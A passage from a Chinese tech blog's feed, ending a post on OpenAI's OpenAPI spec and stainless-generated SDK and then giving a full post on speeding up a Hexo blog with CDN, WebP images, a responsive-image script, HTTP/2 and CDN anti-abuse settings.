class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">paths:</span></span><br><span class="line">  <span class="comment"># <span class="doctag">Note:</span> When adding an endpoint, make sure you also add it in the `groups` section, in the end of this file,</span></span><br><span class="line">  <span class="comment"># under the appropriate group</span></span><br><span class="line">  <span class="string">/chat/completions:</span></span><br><span class="line">    <span class="attr">post:</span></span><br><span class="line">      <span class="attr">operationId:</span> <span class="string">createChatCompletion</span></span><br><span class="line">      <span class="attr">tags:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">Chat</span></span><br><span class="line">      <span class="attr">summary:</span> <span class="string">Creates</span> <span class="string">a</span> <span class="string">model</span> <span class="string">response</span> <span class="string">for</span> <span class="string">the</span> <span class="string">given</span> <span class="string">chat</span> <span class="string">conversation.</span></span><br></pre></td></tr></table></figure><p>其中 post 说明这个接口支持 post 请求，operationId 是这个操作的唯一标识符，tags 将这个操作分类为 “Chat”，summary 提供了这个操作的简短描述。接下来是关键的对请求和响应的一些约束，整体有比较高的可读性了，比如 requestBody 定义了请求需要的数据，required: true 表示请求体是必需的，content 指定了请求体的内容类型，这里是 application&#x2F;json。这里需要说明的是 <strong>schema 引用</strong>了一个定义在文档其他地方的模式（CreateChatCompletionRequest），用于描述请求体的结构。这样做的好处是，可以在多个地方引用同一个模式，避免重复写同样的内容。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">requestBody:</span></span><br><span class="line">  <span class="attr">required:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">content:</span></span><br><span class="line">    <span class="attr">application/json:</span></span><br><span class="line">      <span class="attr">schema:</span></span><br><span class="line">        <span class="string">$ref:</span> <span class="string">&quot;#/components/schemas/CreateChatCompletionRequest&quot;</span></span><br><span class="line"><span class="attr">responses:</span></span><br><span class="line">  <span class="attr">&quot;200&quot;:</span></span><br><span class="line">    <span class="attr">description:</span> <span class="string">OK</span></span><br><span class="line">    <span class="attr">content:</span></span><br><span class="line">      <span class="attr">application/json:</span></span><br><span class="line">        <span class="attr">schema:</span></span><br><span class="line">          <span class="string">$ref:</span> <span class="string">&quot;#/components/schemas/CreateChatCompletionResponse&quot;</span></span><br></pre></td></tr></table></figure><p>CreateChatCompletionRequest 的定义在后面，如下图，也是比较复杂的。里面会对请求体里面每个参数的类型，是否必须，是否是 enum 内容等都做了详细的说明。请求的回复 responses 也是类似的，整个回包靠 CreateChatCompletionResponse 指定格式，这里不再赘述。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240109_openai_python_sdk_learn_yaml_msg.png" alt="OpenAI 的 CreateChatCompletionRequest 的定义"></p><p>接下来是自定义扩展元数据 <code>x-oaiMeta</code> 部分，name, group, returns, path 提供了操作的额外信息，examples 提供了不同场景下的请求和响应示例，包括使用 cURL、Python 和 Node.js 的代码示例，以及相应的响应体示例。通过提供具体的使用示例，使得 API 文档更加易于理解和使用。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>目前 stainless 应该还是 beta 阶段，只有 OpenAI, Lithic 等个别几家公司使用，也没有对外的详细文档。并且从目前的收费标准来看，需要 250$&#x2F;month，对于小开发者来说，还是有点贵的。不过如果后面足够成熟，还是可以考虑引入 stainless 来生成代码，这样就不用人工去写了，也不用太担心代码质量问题。</p><p>不得不说，OpenAI 不亏是 AI 的引领者，从这里 SDK 代码生成的自动化过程，也能感受到对写代码这件事情的不断优化。相信随着 AI 的不断成熟，写代码这件事情，AI 参与的会越来越多，帮忙生成越来越多代码。</p>]]></content>
    
    
    <summary type="html">剖析了 OpenAI 开源的 ChatGPT Python SDK 库源码，介绍了该库使用 Python 高级特性编写的设计，以及最近引入 stainless 自动生成SDK代码的实践。简单解析了 OpenAPI 规范，讲解了如何基于接口定义自动化生成SDK，对编写高质量、易用的 API 客户端代码有很好的参考。</summary>
    
    
    
    <category term="项目实践" scheme="https://selfboot.cn/categories/%E9%A1%B9%E7%9B%AE%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="Python" scheme="https://selfboot.cn/tags/Python/"/>
    
    <category term="方法" scheme="https://selfboot.cn/tags/%E6%96%B9%E6%B3%95/"/>
    
    <category term="ChatGPT" scheme="https://selfboot.cn/tags/ChatGPT/"/>
    
  </entry>
  
  <entry>
    <title>个人博客访问速度优化：CDN, 图片压缩, HTTP2</title>
    <link href="https://selfboot.cn/2024/01/03/hexo_blog_speed/"/>
    <id>https://selfboot.cn/2024/01/03/hexo_blog_speed/</id>
    <published>2024-01-03T22:30:52.000Z</published>
    <updated>2024-06-07T06:32:37.901Z</updated>
    
    <content type="html"><![CDATA[<p>个人博客也写了有一段时间了，之前是能访问到就好，对速度没啥追求。前段时间，自己访问的时候，都感觉到页面加载速度比较慢，比较影响体验。此外加载慢的话，还会<strong>影响搜索引擎排名</strong>。于是动手对博客进行了系列的优化，提升了页面的加载速度。中间遇到了不少坑，本文记录下来，希望对大家有所帮助。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240102_hexo_blog_speed_insights.png" alt="个人博客网页加载速度优化"></p><span id="more"></span><p>先说下个人博客的整体架构，博客是基于 <a href="https://hexo.io/index.html">Hexo</a> 搭建的。托管在 GitHub 上，每次增加新的 markdown 文章后，就会触发 Github Action 自动构建，生成静态文件。这里静态页面没有直接用 Github Pages 托管，而是用了 <a href="https://app.netlify.com/">netlify</a>，因为 netlify 提供了免费的 CDN 加速，国内和国外访问延迟都还可以，并且部署也很简单。</p><h2 id="CDN-加速"><a href="#CDN-加速" class="headerlink" title="CDN 加速"></a>CDN 加速</h2><p>首先就是 CDN 加速，对于静态页面，这种方法最简单的、最有效的。博客里的 html 文件，直接用 netlify 自带的 CDN 加速，国内、外访问速度提升了很多。除了静态 html 文件，还有一些页面 css 和 js 资源，以及最耗带宽的图片资源。</p><h3 id="CSS-和-JS-文件"><a href="#CSS-和-JS-文件" class="headerlink" title="CSS 和 JS 文件"></a>CSS 和 JS 文件</h3><p>这里 js 和 css 我也是和博客静态文件一样，依赖 netlify CDN 加速。只要把这些静态文件全部放在博客的主题 css 和 js 目录下，然后在博客模板中引用即可。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">link(rel=&#x27;stylesheet&#x27;, type=&#x27;text/css&#x27;, href=url_for(theme.css) + &#x27;/normalize.min.css&#x27;) </span><br><span class="line">link(rel=&#x27;stylesheet&#x27;, type=&#x27;text/css&#x27;, href=url_for(theme.css) + &#x27;/pure-min.min.css&#x27;) </span><br><span class="line">link(rel=&#x27;stylesheet&#x27;, type=&#x27;text/css&#x27;, href=url_for(theme.css) + &#x27;/grids-responsive-min.css&#x27;) </span><br><span class="line">script(type=&#x27;text/javascript&#x27;, src=url_for(theme.js) + &#x27;/jquery.min.js&#x27;)</span><br></pre></td></tr></table></figure><p>这样的好处在于，解析我博客域名后，会把 html 文件和 js 这些一起从 CDN 加载。在 HTTP2 的情况下，这些文件可以并行加载，提升了加载速度。相比从其他 CDN 加载这些文件，少了 DNS 解析，理论上会更快些。</p><p>不过对于 <code>font-awesome</code>，因为它的 css 文件中引用了字体文件，直接放在主题的 css 目录下还需要很多字体文件，有点麻烦。这里就引用了 CDN 的资源，推荐用 <a href="https://cdnjs.cloudflare.com/">cloudflare</a>，网络活菩萨的 CDN，速度还是很快的。并且各种静态库版本也很全，可以直接在网站上搜索，然后引用。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link(rel=&#x27;stylesheet&#x27;, href=&#x27;https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css&#x27;)</span><br></pre></td></tr></table></figure><p>这里最开始放在 <a href="https://www.bootcdn.cn/index.html">bootcdn</a> 的，用了一段时间后，发现图标加载不出来。看了下，应该是 cdn 上的<strong>图标字体文件损坏</strong>，但是一直也没修复，于是就弃用了。</p><h3 id="图片-CDN"><a href="#图片-CDN" class="headerlink" title="图片 CDN"></a>图片 CDN</h3><p>其实最影响页面加载速度的就是图片，优化的关键点就是图片。这里图片本来是存储在腾讯云 COS 上的，访问也是直接用 COS 链接。图片的优化有几个方面，这里先来看看 CDN 加速，至于图片压缩和自适应，下面展开。</p><p>以腾讯云 CDN 为例，要给 COS 存储开启 CDN 还是比较简单的，2022年5月9日前，支持默认 CDN 加速域名，只需要简单开启就行。不过现在的话，只能用自定义域名，如果做国内加速，<strong>域名还需要备案</strong>。配置起来很简单，基本设置好加速的域名，以及源站地址就行。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240102_hexo_blog_speed_cdn_image.png" alt="腾讯云 CDN 加速 COS 存储"></p><p>这里配置好 CDN 后，就可以通过腾讯云的<strong>实时监控</strong>，看到实时请求数据。包括带宽，请求量，流量命中率，请求数，请求结果状态码等信息。此外，通过<strong>数据分析</strong>，还能看到访问 Top 1000 URL，独立 IP 访问数，Top 100 Referer，<strong>访问用户区域分布</strong>等信息。</p><p>CDN 还有<strong>日志服务</strong>，可以提供每个小时的访问日志下载，里面有请求时间、客户端IP、访问域名、文件路径、字节数大小、省份、运营商、HTTP返回码、Referer、 request-time（毫秒）、UA、Range、HTTP Method、HTTP协议标识、缓存Hit&#x2F;Miss等信息，可以用来做一些分析。</p><p>平常用的比较多的还有刷新预热，比如博客中的一个图片，已经缓存到了 CDN。但是我又改了下图，在 COS 中上传后，可以在这里刷新缓存，这样 CDN 缓存里的就是最新版本的图片了。</p><p>除了腾讯云的 CDN，还有各大云厂商的 CDN，国内的加速都需要域名备案，比较麻烦些。这里可以尝试 Cloudflare 的 R2 存储配合 CDN 加速，免费额度应该也够个人博客用了。</p><h3 id="CDN-防盗刷"><a href="#CDN-防盗刷" class="headerlink" title="CDN 防盗刷"></a>CDN 防盗刷</h3><p>博客图片放在 CDN 上之后，因为一个文章 <a href="http://localhost:4000/2023/12/28/black_hat_SEO/">从外围引流贴看黑产的搜索引擎排名优化生意</a>，不知道得罪了什么人，于是被盗刷了图片的 CDN 流量，搞得我<strong>腾讯云都欠费</strong>了。这里先普及下，一般 CDN 是<strong>按照流量计费</strong>，腾讯云上境内 100GB 一般是 20 元。对于个人博客来说，流量一般很少的，这里的 CDN 费用基本可以忽略。但是如果被人盗刷流量，就会导致 CDN 费用暴涨。如果没有做一些防护，盗刷很简单，只用不断发请求来拉你的图片就行。</p><p>下图就是我 CDN 被盗刷的监控，在 2023 年 12 月 29，只用不到 3 个小时，就被刷了 200G 左右的流量，相当于近 40 元的费用。当然黑产估计还是手下留情了，不然很容易就刷的我破产了。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240102_hexo_blog_speed_cdn_traffic_theft.png" alt="CDN 被盗刷，短时间产生大量流量"></p><p>当然，有一些常规的做法，可以来对抗 CDN 盗刷流量。腾讯云的 <a href="https://cloud.tencent.com/document/product/228/51813">攻击风险高额账单</a> 文档里面介绍的不错，主要有三类方法：</p><ol><li><strong>访问控制</strong>。这里有很多种，比如防盗链，主要防止别人的网站用到你的图片。IP 黑白名单配置，找到攻击者的 IP，全部加入黑名单，不过专业的黑产可能有很多 IP，封不过来。这时候再配一个 IP 频率限制，每个 IP 只给 10 QPS，这样能大幅度提升攻击者的对抗成本。</li><li><strong>流量管理</strong>。腾讯云 CDN 提供的一个兜底方案，比如 5 分钟内流量到 100 MB，或者每天流量到 10GB，就自动关 CDN，防止不小心产生高额账单。</li><li><strong>安全防护</strong>。需要付费购买，对于个人博客来说有点杀鸡用牛刀了，暂时没用到。</li></ol><p>这里对抗黑产的基本原则就是，<strong>在不影响正常用户体验的情况下，增加攻击者的成本。同时如果没有防住，尽量让损失可控</strong>。下面腾讯云我博客图片 CDN 的部分安全防护。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240102_hexo_blog_speed_cdn_traffic_protection.png" alt="CDN 防盗刷简单配置"></p><h2 id="图片优化"><a href="#图片优化" class="headerlink" title="图片优化"></a>图片优化</h2><p>在上了 CDN 后，用 <a href="https://pagespeed.web.dev/">PageSpeed Insights</a> 测了下，发现图片加载比较耗时，优化方法主要有两个：</p><ol><li><strong>优化图片格式</strong>，用 WebP 格式。博客的图片之前都是 png 的，虽然上传 COS 前自动压缩了，但是还是比较大。WebP 是一个非常出色的现代图片格式，与 PNG 相比，WebP <strong>无损图片</strong>的尺寸缩小了 26%。</li><li><strong>自适应图片</strong>。就是根据屏幕大小，加载不同尺寸的图片，比如手机屏幕加载小图，电脑屏幕加载大图。这样可以减少加载的流量，提升加载速度。</li></ol><h3 id="图片格式优化"><a href="#图片格式优化" class="headerlink" title="图片格式优化"></a>图片格式优化</h3><p>这里最直观的方法就是，把博客所有存量的图片<strong>全部转换为 WebP 格式</strong>，重新上传 COS 后，替换博客文章里的图片链接。不过在看腾讯云的文档时，发现 COS 有<strong>图片处理</strong>功能，可以在图片链接后面，加上参数，来完成对图像的格式转换。比如我的图片地址是 <code>https://slefboot-1251736664.file.myqcloud.com/20240102_hexo_blog_speed_http2.png</code>，只用在链接后面加上 <code>/webp</code>，就拿到了一个小的多的 WebP 图片。</p><p>整体配置也很简单，打开 COS bucket 的<strong>数据处理，图片处理</strong>，然后在<strong>图片处理样式</strong>里增加样式即可，上面的格式转换例子，样式描述就是 <code>imageMogr2/format/webp/interlace/1</code>。腾讯云用的万象图片处理，支持了不少处理，包括图片缩放，裁剪，旋转，格式转换，水印，高斯模糊等等。这里只用到了格式转换，其他的可以自己看下文档。</p><p>下图是我用到的几个转换，其中 webp 就是原图转换为 WebP 格式，然后 webp400 就是转换为宽度为 400 像素的图，用来在比较小的设备上显示。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240102_hexo_blog_speed_image_webp.png" alt="腾讯云 COS 图片处理"></p><p>写博客过程中，图片链接还是正常的 png 链接就行，然后 hexo 构建静态文件使，用 JS 脚本来批量把文章里的图片链接加上样式。这里也踩了一个坑，生成的 webp 中，有部分图片链接返回 404，但是 COS 上文件是存在的。后来找了客服，辗转了好几次，才最终定位到问题，万象在解析 URL 的时候，decode 链接里的 + 号。然后客服通过他们自己的后台，给我的桶关闭了这个 decode 选项。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240102_hexo_blog_speed_cdn_image_bug.png" alt="腾讯云 COS 图片处理 Bug"></p><h3 id="自适应图片"><a href="#自适应图片" class="headerlink" title="自适应图片"></a>自适应图片</h3><p>在前面格式转换这里，提到我建了多个样式，对应不同大小的 WebP 图片。接下来要做的就是，根据设备像素大小，来决定具体加载哪个尺寸的图片。在处理前，先推荐一个工具，<a href="https://ausi.github.io/respimagelint/">RespImageLint</a>，可以检查页面中的图片尺寸是否合理。</p><p>把这个工具加到浏览器标签后，访问博客中的文章页面，然后点击 <code>Lint Images</code> 标签，工具就会模拟各种尺寸的设备来访问页面，然后看浏览器请求的图片是否合理。最后会生成一个报告，列出每个图片的检查结果。如下图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240102_hexo_blog_speed_link_images.png" alt="RespImageLint 检查自适应图片"></p><p>当然这个是我用了自适应图片后的检查结果了，如果没有做自适应，就会有很多警告。这里自适应基本思路就是用万象为每张图片提供多个版本大小，然后通过媒体查询、视口尺寸属性等指定在不同像素设备下使用的图片版本。具体到我博客里，在 hexo 渲染 HTML 的时候，用 js 脚本来替换图片链接，增加 srcset，sizes 属性。</p><ul><li>设置 srcset 属性。srcset 属性用于指定图片的不同尺寸来源，允许浏览器根据设备屏幕的大小和分辨率选择合适的图片版本。</li><li>设置 sizes 属性。sizes 属性定义了图片在不同视口（viewport）宽度下应该使用的布局宽度，允许浏览器更准确地选择 srcset 中的合适图片。</li><li>更新图片属性，更新 img 标签的 src、width 和 height 属性，确保图片的适当渲染和比例。</li></ul><p>具体就是在 hexo 项目的根目录下创建 scripts 目录，然后创建 <code>img.js</code> 文件，内容如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cheerio = <span class="built_in">require</span>(<span class="string">&quot;cheerio&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> imageSize = <span class="built_in">require</span>(<span class="string">&quot;image-size&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">&quot;url&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"></span><br><span class="line">hexo.<span class="property">extend</span>.<span class="property">filter</span>.<span class="title function_">register</span>(<span class="string">&quot;after_render:html&quot;</span>, <span class="keyword">function</span> (<span class="params">str, data</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> $ = cheerio.<span class="title function_">load</span>(str);</span><br><span class="line"></span><br><span class="line">  $(<span class="string">&quot;img&quot;</span>).<span class="title function_">each</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> img = $(<span class="variable language_">this</span>);</span><br><span class="line">    <span class="keyword">const</span> src = img.<span class="title function_">attr</span>(<span class="string">&quot;src&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      src &amp;&amp;</span><br><span class="line">      (src.<span class="title function_">endsWith</span>(<span class="string">&quot;.png&quot;</span>) ||</span><br><span class="line">        src.<span class="title function_">endsWith</span>(<span class="string">&quot;.jpeg&quot;</span>) ||</span><br><span class="line">        src.<span class="title function_">endsWith</span>(<span class="string">&quot;.jpg&quot;</span>) ||</span><br><span class="line">        src.<span class="title function_">endsWith</span>(<span class="string">&quot;.gif&quot;</span>) || </span><br><span class="line">        src.<span class="title function_">endsWith</span>(<span class="string">&quot;.webp&quot;</span>))</span><br><span class="line">    ) &#123;</span><br><span class="line">      <span class="keyword">const</span> parsedUrl = url.<span class="title function_">parse</span>(src);</span><br><span class="line">      <span class="keyword">const</span> imgPathPart = parsedUrl.<span class="property">path</span>;</span><br><span class="line">      <span class="keyword">const</span> imgPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&quot;../images&quot;</span>, imgPathPart);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 检查文件是否存在</span></span><br><span class="line">      <span class="keyword">if</span> (fs.<span class="title function_">existsSync</span>(imgPath)) &#123;</span><br><span class="line">        <span class="keyword">const</span> dimensions = <span class="title function_">imageSize</span>(imgPath);</span><br><span class="line">        <span class="keyword">const</span> width = dimensions.<span class="property">width</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> small = src + <span class="string">&quot;/webp400&quot;</span>;</span><br><span class="line">        <span class="keyword">const</span> middle = src + <span class="string">&quot;/webp800&quot;</span>;</span><br><span class="line">        <span class="keyword">const</span> large = src + <span class="string">&quot;/webp1600&quot;</span>;</span><br><span class="line">        <span class="keyword">const</span> origin = src + <span class="string">&quot;/webp&quot;</span>;</span><br><span class="line">        <span class="keyword">let</span> srcset = <span class="string">`<span class="subst">$&#123;origin&#125;</span> <span class="subst">$&#123;width&#125;</span>w`</span>;</span><br><span class="line">        <span class="keyword">if</span> (width &gt; <span class="number">400</span>) srcset += <span class="string">`, <span class="subst">$&#123;small&#125;</span> 400w`</span>;</span><br><span class="line">        <span class="keyword">if</span> (width &gt; <span class="number">800</span>) srcset += <span class="string">`, <span class="subst">$&#123;middle&#125;</span> 800w`</span>;</span><br><span class="line">        <span class="keyword">if</span> (width &gt; <span class="number">1600</span>) srcset += <span class="string">`, <span class="subst">$&#123;large&#125;</span> 1600w`</span>;</span><br><span class="line">        img.<span class="title function_">attr</span>(<span class="string">&quot;srcset&quot;</span>, srcset);</span><br><span class="line">        <span class="keyword">let</span> sizes;</span><br><span class="line">        <span class="keyword">if</span> (width &lt;= <span class="number">400</span>) &#123;</span><br><span class="line">          sizes = <span class="string">`<span class="subst">$&#123;width&#125;</span>px`</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          sizes=<span class="string">&quot;(min-width: 1150px) 723px, (min-width: 48em) calc((100vw - 120px) * 3 / 4 - 50px), (min-width: 35.5em) calc((100vw - 75px), calc(100vw - 40px)&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        img.<span class="title function_">attr</span>(<span class="string">&quot;sizes&quot;</span>, sizes);</span><br><span class="line">        img.<span class="title function_">attr</span>(<span class="string">&quot;src&quot;</span>, origin);</span><br><span class="line">        <span class="keyword">const</span> height = dimensions.<span class="property">height</span>;</span><br><span class="line">        img.<span class="title function_">attr</span>(<span class="string">&quot;width&quot;</span>, width);</span><br><span class="line">        img.<span class="title function_">attr</span>(<span class="string">&quot;height&quot;</span>, height);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> $.<span class="title function_">html</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>然后 hexo 渲染的时候就会调用这个脚本来对图片属性进行处理，渲染后的结果如下：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240103_hexo_blog_speed_image_render.png" alt="自适应图片渲染后的结果"></p><p>接着可以在浏览器的开发者工具中，<strong>选择不同尺寸的屏幕大小</strong>，然后看请求 Network 选项卡中，浏览器具体选择的是哪个图片版本。如下图，在小尺寸下选择的 400 的图片，中尺寸就是 800 的图片。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240103_hexo_blog_speed_image_render_choice.png" alt="自适应图片渲染后在不同设备下的尺寸"></p><h2 id="HTTP-2"><a href="#HTTP-2" class="headerlink" title="HTTP 2"></a>HTTP 2</h2><p>最后一个优化就是，让博客中的请求尽量用 HTTP2 协议。HTTP2 做了很多优化，相比 HTTP1.1 有较大提升，可以很有效的提高网页加载速度。比如可以使用单个 TCP 连接来一次发送多个数据流，使得任何资源都不会会阻碍其他资源。博客静态资源托管在了 Netlify，默认支持 http2，但是里面图片和一些 js 脚本，有的并不支持 http2。在浏览器的控制台工具中，通过 network 选项卡，可以看到每个资源的 http2 支持情况。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240102_hexo_blog_speed_http2.png" alt="博客中各个资源的 HTTP2 支持情况"></p><p>接下来就是把 http 1.1 的请求，升级为 http2。最主要的其实是图片，因为图片其实是流量大头。这里图片放到 CDN 后，就可以开启 HTTP2 了，以腾讯云为例，如下：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240102_hexo_blog_speed_http2_image.png" alt="腾讯云 CDN HTTP2 配置"></p><p>解决图片后，剩下的只有 <strong>Disqus 评论系统</strong>和<strong>百度的统计脚本</strong>还是用的 http1.1 了。看了下 Disqus 的官网，没发现怎么开启 http2，不过考虑到这里评论系统是动态加载，不影响页面加载速度，就先不管了。百度的<a href="https://tongji.baidu.com/web/help/article?id=174&type=0">统计脚本</a> 也不支持 http2，不过考虑到流量没有多少来自百度，百度的统计也比较垃圾，这里就直接去掉百度统计了。目前接了 <a href="https://analytics.google.com/analytics/web/">Google Analytics</a> 和 Cloudflare 的 <a href="https://www.cloudflare.com/zh-cn/web-analytics/">Web analytics</a>，这两个都支持 http2，并且也足够用了。</p><h2 id="效果评估"><a href="#效果评估" class="headerlink" title="效果评估"></a>效果评估</h2><p>网页加载速度评估我这里主要用的是 <a href="https://pagespeed.web.dev/">PageSpeed Insights</a>，和 Google 的 Lighthouse，一般评估网页的几个关键指标：</p><ul><li>FCP，First Contentful Paint，<strong>首次内容渲染</strong> FCP 衡量的是用户到网页后，<strong>浏览器呈现第一段 DOM 内容所用的时间</strong>。网页上的图片、非白色元素和 SVG 都会被视为 DOM 内容。一般 1.8s 以内都是可以接受的，Google 也会认为是 Good。</li><li>LCP，Largest Contentful Paint，<strong>最大内容渲染时间</strong>用于测量视口中最大的内容元素何时渲染到屏幕上。这粗略地估算出网页主要内容何时对用户可见。</li><li>FID，First Input Delay，衡量的是从用户首次与网页互动（比如点击链接）到浏览器能够实际开始处理事件处理脚本以响应该互动的时间。</li></ul><p>下图是各个指标的效果分布：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240103_hexo_blog_speed_web_vitals.png" alt="网页加载指标评估效果"></p><p>还有一些其他指标，这里就先不展开聊了。Google 的 Lighthouse 给出的优化建议会比较详细一些，比如：</p><ul><li>压缩 CSS 和 JS 的大小；</li><li>移除用不到的 CSS 样式等；</li><li>最大限度的减少主线程延迟</li></ul><p>不过这些优化对整体效果提升效果不是很明显，并且需要花费比较大的时间，博客里就没有做这些优化。本博客优化完之后，性能的评分基本在 95 分以上了。不过这里的指标基于你当前地区，比如图片加载速度，国内 CDN 速度就很快，这里评估肯定也不错。</p><p>如果用了 Cloudflare 的 Web analytics，能看到实际访问博客的用户的各项指标，如下图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20240103_hexo_blog_speed_real_vitals.png" alt="Cloudflare Web analytics 博客访问性能实时监测"></p><p>这里 LCP 有 5% 的 Poor，主要是因为博客中的图片，有些地区网络加载图片比较慢，这里也给出了明细，如下：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#layout</span>&gt;<span class="selector-tag">div</span><span class="selector-class">.pure-u-1</span><span class="selector-class">.pure-u-md-3-4</span>&gt;<span class="selector-tag">div</span><span class="selector-class">.content_container</span>&gt;<span class="selector-tag">div</span><span class="selector-class">.post</span>&gt;<span class="selector-tag">div</span><span class="selector-class">.post-content</span>&gt;<span class="selector-tag">p</span>&gt;<span class="selector-tag">a</span><span class="selector-class">.fancybox</span>&gt;<span class="selector-tag">img</span></span><br><span class="line"><span class="selector-tag">slefboot-1251736664</span><span class="selector-class">.file</span><span class="selector-class">.myqcloud</span><span class="selector-class">.com</span>/<span class="number">20230727</span><span class="selector-tag">_chatgpt_hacking_jailbreaking_cover</span><span class="selector-class">.webp</span>/<span class="selector-tag">webp</span></span><br><span class="line"><span class="number">5</span>,<span class="number">485ms</span></span><br><span class="line"><span class="selector-id">#layout</span>&gt;<span class="selector-tag">div</span><span class="selector-class">.pure-u-1</span><span class="selector-class">.pure-u-md-3-4</span>&gt;<span class="selector-tag">div</span><span class="selector-class">.content_container</span>&gt;<span class="selector-tag">div</span><span class="selector-class">.post</span>&gt;<span class="selector-tag">div</span><span class="selector-class">.post-content</span>&gt;<span class="selector-tag">p</span>&gt;<span class="selector-tag">a</span><span class="selector-class">.fancybox</span>&gt;<span class="selector-tag">img</span></span><br><span class="line"><span class="selector-tag">slefboot-1251736664</span><span class="selector-class">.file</span><span class="selector-class">.myqcloud</span><span class="selector-class">.com</span>/<span class="number">20231228</span><span class="selector-tag">_black_hat_SEO_search</span><span class="selector-class">.png</span>/<span class="selector-tag">webp1600</span></span><br><span class="line"><span class="number">8</span>,<span class="number">311ms</span></span><br></pre></td></tr></table></figure><p>说明 CDN 加速也不是 100% 就能解决所有地区的访问，可能换个比较好的 CDN 会有提升吧，不过作为个人博客，也没有继续折腾了。</p><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a href="https://web.dev/articles/vitals">Web Vitals</a><br><a href="https://developer.chrome.com/docs/lighthouse/performance/render-blocking-resources?hl=en">Eliminate render-blocking resources</a><br><a href="https://developers.google.com/speed/webp">An image format for the Web</a><br><a href="https://ausi.github.io/respimagelint/">RespImageLint - Linter for Responsive Images</a><br><a href="https://developer.chrome.com/docs/lighthouse/performance/uses-responsive-images/">Properly size images</a><br><a href="https://developer.chrome.com/docs/lighthouse/performance/performance-scoring?hl=en">Lighthouse performance scoring</a></p>]]></content>
    
    
    <summary type="html">本文详细介绍了个人博客访问速度优化的技术手段，包括CDN加速、WebP格式转换、响应式图片、HTTP/2协议等，并给出具体的代码实现和避坑指南。这些方法能明显提升页面加载速度，改善用户体验。文章还分析了效果评估指标，为搭建高性能博客提供了参考。</summary>
    
    
    
